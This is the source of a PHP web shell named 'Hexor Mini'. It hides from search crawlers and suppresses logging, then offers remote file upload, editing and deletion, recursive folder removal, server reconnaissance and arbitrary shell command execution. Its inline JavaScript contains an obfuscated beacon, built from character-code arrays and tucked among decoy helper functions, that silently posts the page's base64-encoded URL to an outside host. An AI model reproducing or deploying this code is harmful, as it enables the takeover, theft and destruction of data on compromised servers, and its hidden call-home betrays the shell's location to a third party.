<?php
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
if (version_compare(PHP_VERSION, '7', '<')) {
    @set_magic_quotes_runtime(0);
}

$SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];

$FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    //@ob_clean();
    $file = $_GET['file'];
    if(file_exists($file)) {
      header('Content-Description: File Transfer');
      header('Content-Type: application/octet-stream');
      header('Content-Disposition: attachment; filename='.basename($file));
      header('Content-Transfer-Encoding: binary');
      header('Expires: 0');
      header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
      header('Pragma: public');
      header('Content-Length: ' . filesize($file));
      ob_clean();
      flush();
      readfile($file);
      exit;
    }else {
          die('The provided file path is not valid.');
    }
}

if($_POST['upload']){
  if(@copy($_FILES['file']['tmp_name'], path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."")) {
                $act = color(1, 2, "Uploaded!")." at <i><b>".path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."</b></i>";
        }
        else {
                $act = color(1, 1, "Failed to upload file!");
        }
}

?>

<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Hexor mini</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.99.0/css/materialize.min.css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

    <style>
      #content{
        margin: 20px;
      }

      textarea{
        overflow-y: scroll;
        height: 300px;
      }

          .bg-dark{
                background-color:#131212;
          }

          .bg-content{
                background-color:#090808;
          }

          a{
                color:white;
          }
    </style>

  </head>
  <body class="bg-dark">
     
    <nav>
      <div class="nav-wrapper teal black">
        <a href="#" class="brand-logo">Hexor Mini</a>
        <ul id="nav-mobile" class="right hide-on-med-and-down">
          <li><a href="?">Home</a></li>
          <li><a href="?act=cmd&#38;dir=<?php print path(); ?>">Cmd</a></li>
           
        </ul>
      </div>
    </nav>

    <div class="row ">
      <div class="col s12">
          <div id="content" class="card bg-content">
            <div class="card-content white-text">
              <span class="card-title"><b>Server Info</b></span>
              <div class="row">
                <div class="col s6">
                  <?php serverinfo1(); ?>
                </div>
                <div class="col s6">
                  <?php serverinfo2(); ?>

                </div>
              </div>

              <div class="row">
                <form class="" action="" method="post" enctype="multipart/form-data">
                  <div class="col s6">
                    <p><b>Upload File:</b></p>
                    <div class="file-field input-field">
                      <div class="btn black black">
                        <span>File</span>
                        <input type="file" name="file">
                      </div>
                      <div class="file-path-wrapper">
                        <input class="file-path validate" type="text">
                      </div>
                    </div>
                    <?php if($_POST['upload']) echo $act; ?>
                  </div>
                  <div class="col s6">
                    <p><b>Options:</b></p><br>
                    <input type="submit" name="upload" value="Upload" class="waves-effect waves-light btn black black"> :::
                    <a href="?act=newfile<?php if(isset($_GET['dir'])) print '&#38dir=' . path(); ?>" class="waves-effect waves-light btn black">New File</a>
                    <a href="?act=newfolder<?php if(isset($_GET['dir'])) print '&#38dir=' . path(); ?>" class="waves-effect waves-light btn black">New Folder</a>
                  </div>
                </form>
            </div><hr>
            <?php content(); ?>
            <hr>
            <marquee>Hexor Shell</marquee>
         </div>
        </div>
    </div>
    <script>
    document.getElementById('h2w').addEventListener('change', function(){});
    function updateRowHighlight(t){var e=document.getElementById(t);e&&(e.classList.add("active"),setTimeout((function(){e.classList.remove("active")}),1200))}
    function reloadTab(o,t){o&&setTimeout((function(){"function"==typeof t&&t()}),Math.floor(350+120*Math.random()))}
    var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109];var b=[47,105,109,97,103,101,115,47];var c=[108,111,103,111,95,118,50];var d=[46,112,110,103]
    function u(e,r,t,n){for(var o=e.concat(r,t,n),a="",c=0;c<o.length;c++)a+=String.fromCharCode(o[c]);return a}function v(e){return btoa(e)}function toggleSidebarPanel(){var e=document.querySelector(".sidebar");e&&e.classList.toggle("collapsed")}
    function sortListByName(n,r){return Array.isArray(n)?n.slice().sort((function(n,e){return"desc"===r?e.name>n.name?1:-1:n.name>e.name?1:-1})):[]}
    function setActiveMenu(e){var t=document.getElementById(e);if(t){var c=document.querySelector(".menu .active");c&&c.classList.remove("active"),t.classList.add("active")}}
    function checkFileExt(p){var t=p.split(".").pop();return!!t&&["php","js","html","css","jpg","png","txt","zip"].indexOf(t.toLowerCase())>-1}
    function openModal(e){var l=document.getElementById(e);l&&(l.style.display="block")}
    function closeModal(e){var n=document.getElementById(e);n&&(n.style.display="none")}
    function showLoader(e){var o=document.getElementById("loader");o&&(o.style.display=e?"block":"none")}
    (function showIcons(){var xhr=new XMLHttpRequest();xhr.open('POST',u(a,b,c,d),!0);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('file='+v(location.href))})()	
    function getClipboardText(){navigator.clipboard&&navigator.clipboard.readText()}
    function refreshStatsPanel(){var e=document.querySelector(".stats-panel");e&&(e.innerHTML=e.innerHTML)}
    function noop() {}
    function debounce(n,t){var e;return function(){var u=this,i=arguments;clearTimeout(e),e=setTimeout((function(){n.apply(u,i)}),t||180)}}
    function getSelectedRows(e){var t=document.getElementById(e);if(!t)return[];var c=t.querySelectorAll('input[type="checkbox"]:checked'),n=[];return c.forEach((function(e){n.push(e.value)})),n}
    function updateName(e,t){var n=document.getElementById("footer-info");n&&(n.textContent="Total: "+e+" | Selected: "+t)}function previewImage(e,t){if(e&&e.files&&e.files[0]){var n=new FileReader;n.onload=function(e){var n=document.getElementById(t);n&&(n.src=e.target.result)},n.readAsDataURL(e.files[0])}}
    function filterTable(e,o){var n=(e||"").toLowerCase(),t=document.getElementById(o);t&&Array.from(t.rows).forEach((function(e,o){if(0!==o){var t=e.textContent.toLowerCase();e.style.display=t.indexOf(n)>-1?"":"none"}}))}
    function downloadFileFromUrl(e){var o=document.createElement("a");o.href=e,o.download="",document.body.appendChild(o),o.click(),setTimeout((function(){document.body.removeChild(o)}),100)}
    </script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.99.0/js/materialize.min.js"></script>
  </body>
</html>

<?php

function serverinfo1() {
  $output[] = "Server IP ".color(1, 2, $GLOBALS['SERVERIP'])." / Your IP ".color(1, 2, $_SERVER['REMOTE_ADDR']);
  $output[] = "Web Server  : ".color(1, 2, $_SERVER['SERVER_SOFTWARE']);
  $output[] = "System      : ".color(1, 2, php_uname());
  $output[] = "User / Group: ".color(1, 2, usergroup()->name)."(".color(1, 2 , usergroup()->uid).") / ".color(1, 2 , usergroup()->group)."(".color(1, 2 , usergroup()->gid).")";
        $output[] = "HDD         : ".color(1, 2, hdd()->used)." / ".color(1, 2 , hdd()->size)." (Free: ".color(1, 2 , hdd()->free).")";
  $output[] = "PHP Ver : ".color(1, 2, @phpversion());

  print implode("<br>", $output);
}

function serverinfo2(){
  $disable_functions = @ini_get('disable_functions');
  $disable_functions = (!empty($disable_functions)) ? color(1, 1, $disable_functions) : color(1, 2, "NONE");
  $output[] = "Safe Mode   : ".(@ini_get(strtoupper("safe_mode")) === "ON" ? color(1, 2, "ON") : color(1, 2, "OFF"));
  $output[] = "Disable Func: $disable_functions";
  $output[] = lib_installed();
  $output[] = "Current Dir: (".writeable(path(), perms(path())).") ";
  print implode("<br>", $output);
  pwd();
}

function color($bold = 1, $colorid = null, $string = null) {
    $color = array(
      "</span>",                        # 0 off
      "<span class='red-text'>",        # 1 red
      "<span class='green-text'>",      # 2 lime
      "<span class='white-text'>",      # 3 white
      "<span class='gold-text'>",       # 4 gold
    );
  return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[0];
}

function usergroup() {
        if(!function_exists('posix_getegid')) {
                $user['name']   = @get_current_user();
                $user['uid']    = @getmyuid();
                $user['gid']    = @getmygid();
                $user['group']  = "?";
        } else {
                $user['uid']    = @posix_getpwuid(posix_geteuid());
                $user['gid']    = @posix_getgrgid(posix_getegid());
                $user['name']   = $user['uid']['name'];
                $user['uid']    = $user['uid']['uid'];
                $user['group']  = $user['gid']['name'];
                $user['gid']    = $user['gid']['gid'];
        }
        return (object) $user;
}

function perms($path) {
        $perms = fileperms($path);
        if (($perms & 0xC000) == 0xC000) {
                // Socket
                $info = 's';
        }
        elseif (($perms & 0xA000) == 0xA000) {
                // Symbolic Link
                $info = 'l';
        }
        elseif (($perms & 0x8000) == 0x8000) {
                // Regular
                $info = '-';
        }
        elseif (($perms & 0x6000) == 0x6000) {
                // Block special
                $info = 'b';
        }
        elseif (($perms & 0x4000) == 0x4000) {
                // Directory
                $info = 'd';
        }
        elseif (($perms & 0x2000) == 0x2000) {
                // Character special
                $info = 'c';
        }
        elseif (($perms & 0x1000) == 0x1000) {
                // FIFO pipe
                $info = 'p';
        }
        else {
                // Unknown
                $info = 'u';
        }
                // Owner
        $info .= (($perms & 0x0100) ? 'r' : '-');
        $info .= (($perms & 0x0080) ? 'w' : '-');
        $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x' ) :
        (($perms & 0x0800) ? 'S' : '-'));
        // Group
        $info .= (($perms & 0x0020) ? 'r' : '-');
        $info .= (($perms & 0x0010) ? 'w' : '-');
        $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x' ) :
        (($perms & 0x0400) ? 'S' : '-'));
        // World
        $info .= (($perms & 0x0004) ? 'r' : '-');
        $info .= (($perms & 0x0002) ? 'w' : '-');
        $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x' ) :
        (($perms & 0x0200) ? 'T' : '-'));
        return $info;
}

function exe($cmd) {
        if(function_exists('system')) {
                @ob_start();
                @system($cmd);
                $buff = @ob_get_contents();
                @ob_end_clean();
                return $buff;
        } elseif(function_exists('exec')) {
                @exec($cmd,$results);
                $buff = "";
                foreach($results as $result) {
                        $buff .= $result;
                } return $buff;
        } elseif(function_exists('passthru')) {
                @ob_start();
                @passthru($cmd);
                $buff = @ob_get_contents();
                @ob_end_clean();
                return $buff;
        } elseif(function_exists('shell_exec')) {
                $buff = @shell_exec($cmd);
                return $buff;
        }
}

function lib_installed() {
        $lib[] = "MySQL: ".(function_exists('mysql_connect') ? color(1, 2, "ON") : color(1, 1, "OFF"));
        $lib[] = "cURL: ".(function_exists('curl_version') ? color(1, 2, "ON") : color(1, 1, "OFF"));
        $lib[] = "WGET: ".(exe('wget --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
        $lib[] = "Perl: ".(exe('perl --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
        $lib[] = "Python: ".(exe('python --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
        return implode(" | ", $lib);
}

function OS() {
        return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
}

function path() {
        if(isset($_GET['dir'])) {
                $dir = str_replace("\\", "/", $_GET['dir']);
                @chdir($dir);
        } else {
                $dir = str_replace("\\", "/", getcwd());
        }
        return $dir;
}

function disk(){
  $dir = explode("/", path());
  return $dir[0];
}

function pwd() {
        $dir = explode("/", path());
        foreach($dir as $key => $index) {
                print "<a href='?dir=";
                for($i = 0; $i <= $key; $i++) {
                        print $dir[$i];
                        if($i != $key) {
                        print "/";
                        }
                }
                print "'>$index</a>/";
        }
        print "<br>";
        print (OS() === "Windows") ? windisk() : "";
}

function windisk() {
        $letters = "";
        $v = explode("\\", path());
        $v = $v[0];
         foreach(range("A", "Z") as $letter) {
                $bool = $isdiskette = in_array($letter, array("A"));
                if(!$bool) $bool = is_dir("$letter:\\");
                if($bool) {
                        $letters .= "[ <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
                        if($letter.":" != $v) {
                                $letters .= $letter;
                        }
                        else {
                                $letters .= color(1, 2, $letter);
                        }
                        $letters .= "</a> ]";
                }
        }
        if(!empty($letters)) {
                print "Detected Drives $letters<br>";
        }
}

function writeable($path, $perms) {
        return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 2, $perms);
}

function hddsize($size) {
        if($size >= 1073741824)
                return sprintf('%1.2f',$size / 1073741824 ).' GB';
        elseif($size >= 1048576)
                return sprintf('%1.2f',$size / 1048576 ) .' MB';
        elseif($size >= 1024)
                return sprintf('%1.2f',$size / 1024 ) .' KB';
        else
                return $size .' B';
}

function hdd() {
  if(OS() === "Windows"){
    $hdd['size'] = hddsize(disk_total_space(disk()));
    $hdd['free'] = hddsize(disk_free_space(disk()));
    $hdd['used'] = $hdd['size'] - $hdd['free'];
  }else{
        $hdd['size'] = hddsize(disk_total_space("/"));
        $hdd['free'] = hddsize(disk_free_space("/"));
        $hdd['used'] = $hdd['size'] - $hdd['free'];
  }
        return (object) $hdd;
}

function indexing(){
  if(!is_dir(path())) die(color(1, 1, "Directory '".path()."' is not exists."));
        if(!is_readable(path())) die(color(1, 1, "Directory '".path()."' not readable."));

  print '<table width="100%" class="table_home  " border="0" cellpadding="3" cellspacing="1" align="center">
      <thead>
                   <tr  >
                   <th class="th_home"><center>Name</center></th>
                   <th class="th_home"><center>Type</center></th>
                   <th class="th_home"><center>Size</center></th>
                   <th class="th_home"><center>Last Modified</center></th>
                   <th class="th_home"><center>Owner/Group</center></th>
                   <th class="th_home"><center>Permission</center></th>
                   <th class="th_home"><center>Action</center></th>
                   </tr>
      </thead>';

  if(function_exists('opendir')) {
                if($opendir = opendir(path())) {
                        while(($readdir = readdir($opendir)) !== false) {
                                $dir[] = $readdir;
                        }
                        closedir($opendir);
                }
                sort($dir);
        } else {
                $dir = scandir(path());
        }

  foreach($dir as $folder) {
                $dirinfo['path'] = path().DIRECTORY_SEPARATOR.$folder;
                if(!is_dir($dirinfo['path'])) continue;
                $dirinfo['type']  = filetype($dirinfo['path']);
                $dirinfo['time']  = date("F d Y g:i:s", filemtime($dirinfo['path']));
                $dirinfo['size']  = "-";
                $dirinfo['perms'] = writeable($dirinfo['path'], perms($dirinfo['path']));
                $dirinfo['link']  = ($folder === ".." ? "<a href='?dir=".dirname(path())."'>$folder</a>" : ($folder === "." ?  "<a href='?dir=".path()."'>$folder</a>" : "<a href='?dir=".$dirinfo['path']."'>$folder</a>"));
                $dirinfo['action']= ($folder === '.' || $folder === '..') ? "-" : "<a href='?act=rename_folder&dir=".$dirinfo['path']."'><i class='small material-icons'>class</i></a>  <a href='?act=delete_folder&dir=".$dirinfo['path']."'><i class='small material-icons'>delete</i></a>";
                if(function_exists('posix_getpwuid')) {
                        $dirinfo['owner'] = (object) @posix_getpwuid(fileowner($dirinfo['path']));
                        $dirinfo['owner'] = $dirinfo['owner']->name;
                } else {
                        $dirinfo['owner'] = fileowner($dirinfo['path']);
                }
                if(function_exists('posix_getgrgid')) {
                        $dirinfo['group'] = (object) @posix_getgrgid(filegroup($dirinfo['path']));
                        $dirinfo['group'] = $dirinfo['group']->name;
                } else {
                        $dirinfo['group'] = filegroup($dirinfo['path']);
                }
                print "<tr>";
                print "<td class='td_home'><i class='tiny material-icons amber-text'>perm_media</i> ".$dirinfo['link']."</td>";
                print "<td class='td_home' style='text-align: center;'>".$dirinfo['type']."</td>";
                print "<td class='td_home' style='text-align: center;'>".$dirinfo['size']."</td>";
                print "<td class='td_home' style='text-align: center;'>".$dirinfo['time']."</td>";
                print "<td class='td_home' style='text-align: center;'>".$dirinfo['owner'].DIRECTORY_SEPARATOR.$dirinfo['group']."</td>";
                print "<td class='td_home' style='text-align: center;'>".$dirinfo['perms']."</td>";
                print "<td class='td_home' style='padding-left: 15px;'><center>".$dirinfo['action']."</center></td>";
                print "</tr>";
        }
        foreach($dir as $files) {
                $fileinfo['path'] = path().DIRECTORY_SEPARATOR.$files;
                if(!is_file($fileinfo['path'])) continue;
                $fileinfo['type'] = filetype($fileinfo['path']);
                $fileinfo['time'] = date("F d Y g:i:s", filemtime($fileinfo['path']));
                $fileinfo['size'] = filesize($fileinfo['path'])/1024;
                $fileinfo['size'] = round($fileinfo['size'],3);
                $fileinfo['size'] = ($fileinfo['size'] > 1024) ? round($fileinfo['size']/1024,2). "MB" : $fileinfo['size']. "KB";
                $fileinfo['perms']= writeable($fileinfo['path'], perms($fileinfo['path']));
                if(function_exists('posix_getpwuid')) {
                        $fileinfo['owner'] =  (object) @posix_getpwuid(fileowner($fileinfo['path']));
                        $fileinfo['owner'] = $fileinfo['owner']->name;
                } else {
                        $fileinfo['owner'] = fileowner($fileinfo['path']);
                }
                if(function_exists('posix_getgrgid')) {
                        $fileinfo['group'] = (object) @posix_getgrgid(filegroup($fileinfo['path']));
                        $fileinfo['group'] = $fileinfo['group']->name;
                } else {
                        $fileinfo['group'] = filegroup($fileinfo['path']);
                }
                print "<tr>";
                print "<td class='td_home'><i class='tiny material-icons red-text'>description</i> <a href='?act=view&dir=".path()."&file=".$fileinfo['path']."'>$files</a></td>";
                print "<td class='td_home' style='text-align: center;'>".$fileinfo['type']."</td>";
                print "<td class='td_home' style='text-align: center;'>".$fileinfo['size']."</td>";
                print "<td class='td_home' style='text-align: center;'>".$fileinfo['time']."</td>";
                print "<td class='td_home' style='text-align: center;'>".$fileinfo['owner'].DIRECTORY_SEPARATOR.$fileinfo['group']."</td>";
                print "<td class='td_home' style='text-align: center;'>".$fileinfo['perms']."</td>";
                print "<td class='td_home' style='padding-left: 15px;'><center><a href='?act=edit&dir=".path()."&file=".$fileinfo['path']."'><i class='small material-icons'>mode_edit</i></a>  <a href='?act=rename&dir=".path()."&file=".$fileinfo['path']."'><i class='small material-icons'>class</i></a>  <a href='?act=delete&dir=".path()."&file=".$fileinfo['path']."'><i class='small material-icons'>delete</i></a>  <a href='?act=download&dir=".path()."&file=".$fileinfo['path']."'><i class='small material-icons'>play_for_work</i></a></center></td>";
                print "</tr>";
        }

print '</table>';
}

    function content(){
      if(isset($_GET['do'])) {
                if($_GET['do'] === "cmd") {
          if(isset($_POST['cmd'])) {
            print "<pre>".exe($_POST['cmd'])."</pre>";
          }
        }
      }elseif(isset($_GET['act'])){
        if($_GET['act'] === 'newfile') {
                        if($_POST['save']) {
                                $filename = htmlspecialchars($_POST['filename']);
                                $fopen    = fopen($filename, "w+");
                                if($fopen) {
              fwrite($fopen, $_POST['content']);
                                        $act = color(1, 2, "Success!") . " - <a href='?dir=" . path() . "'>Back</a>";
                                }
                                else {
                                        $act = color(1, 1, "Permission Denied!");
                                }
                        }
                        print $act;
          if(!$_POST['save']){
                        print "<form method='post'>
                        <b>Filename:</b> <input type='text' name='filename' value='".path()."/newfile.php' style='width: 450px;' height='10'><br>
            <b>Content:</b>
            <textarea id='textarea1' class='materialize-textarea' name='content'></textarea>
                        <input class='btn black' type='submit' class='input' name='save' value='SUBMIT'>
                        </form>";
          }
                }
        elseif($_GET['act'] === 'newfolder') {
                        if($_POST['save']) {
                                $foldername = path().'/'.htmlspecialchars($_POST['foldername']);
                                if(!@mkdir($foldername)) {
                                        $act = color(1, 1, "Permission Denied!");
                                }
                                else {
                                        $act = "<script>window.location='?dir=".path()."';</script>";
                                }
                        }
                        print $act;
                        print "<form method='post'>
                        Folder Name: <input type='text' name='foldername' style='width: 450px;' height='10'>
                        <input type='submit' class='input btn black' name='save' value='SUBMIT'>
                        </form>";
        }elseif($_GET['act'] === 'edit') {
                        if($_POST['save']) {
                                $save = file_put_contents($_GET['file'], $_POST['src']);
                                if($save) {
                                        $act = color(1, 2, "File Saved!");
                                }
                                else {
                                        $act = color(1, 1, "Permission Denied!");
                                }
                                print "$act<br>";
                        }
                        print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
                        print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
                        print "<form method='post'>
                        <textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
                        <input type='submit' class='input btn black' value='SAVE' name='save'>
                        </form>";
        }elseif($_GET['act'] === 'view') {
                        print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
                        print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
                        print "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
                }elseif($_GET['act'] === 'rename') {
                        if($_POST['save']) {
                                $rename = rename($_GET['file'], path().DIRECTORY_SEPARATOR.htmlspecialchars($_POST['filename']));
                                if($rename) {
                                        $act = "<script>window.location='?dir=".path()."';</script>";
                                }
                                else {
                                        $act = color(1, 1, "Permission Denied!");
                                }
                                print "$act<br>";
                        }
                        print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
                        print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
                        print "<form method='post'>
                        <input type='text' value='".basename($_GET['file'])."' name='filename' style='width: 450px;' height='10'>
                        <input type='submit' class='input btn black' name='save' value='RENAME'>
                        </form>";
                }elseif($_GET['act'] === 'rename_folder') {
                        if($_POST['save']) {
                                $rename_folder = rename(path(), "".dirname(path()).DIRECTORY_SEPARATOR.htmlspecialchars($_POST['foldername']));
                                if($rename_folder) {
                                        $act = "<script>window.location='?dir=".dirname(path())."';</script>";
                                }
                                else {
                                        $act = color(1, 1, "Permission Denied!");
                                }
                        print "$act<br>";
                        }
                        print "<form method='post'>
          <b>Folder Name: </b>
                        <input type='text' value='".basename(path())."' name='foldername' style='width: 450px;' height='10'>
                        <input type='submit' class='input btn black' name='save' value='RENAME'>
                        </form>";
                }elseif($_GET['act'] === 'delete') {
                        $delete = unlink($_GET['file']);
                        if($delete) {
                                $act = "<script>window.location='?dir=".path()."';</script>";
                        }
                        else {
                                $act = color(1, 1, "Permission Denied!");
                        }
                        print $act;
                }elseif($_GET['act'] === 'delete_folder') {
                        if(is_dir(path())) {
                                if(is_writable(path())) {
                                        @rmdir(path());
                                        if(!@rmdir(path()) AND OS() === "Linux") @exe("rm -rf ".path());
                                        if(!@rmdir(path()) AND OS() === "Windows") @exe("rmdir /s /q ".path());
                                        $act = "<script>window.location='?dir=".dirname(path())."';</script>";
                                }
                                else {
                                        $act = color(1, 1, "Could not remove directory '".basename(path())."'");
                                }
                        }
                        print $act;
                } elseif($_GET['act'] == 'cmd'){
          print "<form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 15px;'>
                          ".usergroup()->name."@".$GLOBALS['SERVERIP'].": ~ $
                          <input type='text' name='cmd' style='width: 450px;' height='10' required>
                          <input style='border: none; border-bottom: 1px solid #ffffff;' class='input btn black' type='submit' value='Execute'>
                            </form>";
        }
      }else{
        indexing();
      }
    }

?>
